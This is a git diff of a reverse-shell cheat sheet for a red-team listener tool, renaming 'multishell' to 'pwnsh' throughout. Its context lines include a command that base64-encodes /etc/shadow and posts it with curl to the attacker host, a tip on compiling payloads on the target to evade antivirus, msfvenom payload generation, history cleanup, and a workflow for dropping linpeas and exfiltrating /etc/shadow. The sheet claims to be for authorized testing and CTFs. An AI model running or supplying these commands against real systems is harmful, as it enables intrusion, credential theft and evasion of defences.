@@ -1,6 +1,6 @@
 # Reverse Shell Cheat Sheet
 
-Companion reference for **multishell** (or any multi-handler: `pwncat`, `nc -lvp`,
+Companion reference for **pwnsh** (or any multi-handler: `pwncat`, `nc -lvp`,
 `socat`, Metasploit `multi/handler`).
 
 > For authorized security testing, CTFs, red-team engagements, and
@@ -12,7 +12,7 @@ Companion reference for **multishell** (or any multi-handler: `pwncat`, `nc -lvp
 ## Placeholders
 
 - `$LHOST` — your attack box's IP, reachable from the target
-- `$LPORT` — your listener port (multishell defaults to `9090`)
+- `$LPORT` — your listener port (pwnsh defaults to `9090`)
 
 Export them once so you can paste the commands verbatim:
 
@@ -24,8 +24,8 @@ export LPORT=9090
 ## Start the listener first
 
 ```bash
-multishell              # TCP :9090
-multishell -p 4444      # different port
+pwnsh              # TCP :9090
+pwnsh -p 4444      # different port
 ```
 
 Once a callback lands, press **Ctrl+U** for PTY upgrade, **Ctrl+F** to
@@ -593,7 +593,7 @@ a local shell into a reverse one.
 
 ## 11. Binary generators — msfvenom
 
-Pairs nicely with multishell's `/put` to drop straight into the target.
+Pairs nicely with pwnsh's `/put` to drop straight into the target.
 
 ### Windows EXE (stageless)
 
@@ -740,7 +740,7 @@ base64 /etc/shadow | while read l; do curl -d "$l" http://$LHOST/; done
 
 ### Avoiding AV by compiling on-target
 
-If `cc` exists, push the source with multishell's `/put` and compile there —
+If `cc` exists, push the source with pwnsh's `/put` and compile there —
 skips file-based AV that's tuned for common shellcode signatures.
 
 ---
@@ -751,7 +751,7 @@ Pasted shell is half the battle; making it *usable* is the other half.
 
 ### Step 1 — get a PTY
 
-multishell: **Ctrl+U** (or `/pty`). Under the hood:
+pwnsh: **Ctrl+U** (or `/pty`). Under the hood:
 
 ```bash
 python3 -c 'import pty,os;pty.spawn([os.environ.get("SHELL","/bin/bash"),"-i"])'
@@ -777,9 +777,9 @@ stty rows 40 cols 120
 export TERM=xterm-256color
 ```
 
-multishell's PTY upgrade already does this.
+pwnsh's PTY upgrade already does this.
 
-### Step 3 — disable local echo, background nc/handler for raw mode (non-multishell)
+### Step 3 — disable local echo, background nc/handler for raw mode (non-pwnsh)
 
 Only needed if you're using raw `nc`/`socat` without a proper TUI:
 
@@ -790,10 +790,10 @@ stty raw -echo; fg          # kernel no longer buffers; listener resumes
 reset                       # clean the screen
 ```
 
-multishell does not require this — its TUI is line-oriented, and the PTY
+pwnsh does not require this — its TUI is line-oriented, and the PTY
 upgrade makes the remote side support arrow keys, tab completion,
 `vim`, `less`, `top`, etc. To drive interactive full-screen apps you
-currently still type into the multishell Input (line by line). Raw-pass
+currently still type into the pwnsh Input (line by line). Raw-pass
 mode is a roadmap item.
 
 ### Step 4 — clean up history
@@ -865,7 +865,7 @@ Defensive hardening:
 
 ---
 
-## Pair with multishell
+## Pair with pwnsh
 
 Once you land on `:9090`, the workflow is:
 
@@ -874,9 +874,9 @@ Once you land on `:9090`, the workflow is:
 3. `/tag web-prod-01` — rename the session to something meaningful.
 4. `/note found rails secret_key_base at /opt/app/.env` — stick a note on it.
 5. `/put ~/tools/linpeas.sh /tmp/.x` — drop a tool. sha256 verified.
-6. `/get /etc/shadow` — exfil. Lands in `~/.multishell/loot/session-NNNN/`.
+6. `/get /etc/shadow` — exfil. Lands in `~/.pwnsh/loot/session-NNNN/`.
 7. `Ctrl+F` — later, search across every session you've ever run for
    `password`, `token`, `AKIA`, etc.
 
 Every session is recorded as an asciinema `.cast` — replay evidence for
-the report with `asciinema play ~/.multishell/sessions/<…>.cast`.
+the report with `asciinema play ~/.pwnsh/sessions/<…>.cast`.
